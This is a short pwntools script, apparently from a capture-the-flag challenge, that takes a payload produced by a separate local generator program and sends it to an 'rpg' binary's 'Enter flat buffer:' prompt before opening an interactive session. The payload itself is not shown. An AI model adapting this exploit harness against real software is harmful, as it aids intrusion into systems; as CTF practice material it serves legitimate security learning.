from pwn import *
context.log_level="debug"
gen=process("./test")
payload=gen.recvuntil(b'finish!',drop=True)
sh=process("../rpg")
# gdb.attach(sh,"b *$rebase(0x1439)\nc")
sh.sendlineafter(b"Enter flat buffer:",payload)
sh.interactive()
